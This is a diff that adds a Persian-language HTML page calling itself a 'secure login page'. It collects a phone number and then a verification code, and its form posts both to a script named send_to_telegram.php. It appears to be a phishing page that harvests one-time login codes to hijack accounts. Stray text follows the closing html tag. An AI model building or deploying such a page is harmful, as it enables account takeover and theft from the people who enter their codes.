@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحه ورود امن</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="script.js" defer></script>
+</head>
+<body>
+    <div class="container">
+        <h2>ورود به حساب کاربری</h2>
+        <form id="loginForm" action="send_to_telegram.php" method="post">
+            <!-- مرحله اول: ورود شماره تلفن -->
+            <div id="step1">
+                <label for="phone">شماره تلفن:</label>
+                <input type="tel" id="phone" name="phone" placeholder="شماره تلفن تون وارد کنید" required>
+                <button type="button" class="btn" onclick="sendCode()">ارسال کد تأیید</button>
+            </div>
+
+            <!-- مرحله دوم: ورود کد تأیید -->
+            <div id="step2" style="display: none;">
+                <label for="code">کد تأیید:</label>
+                <input type="text" id="code" name="code" placeholder="کد تأیید دریافتی" required>
+                <button type="submit" class="btn">ورود</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>شماره تلفن تان وارد نمایید 
+<div>‌</div>
+<span>sarhang</span>
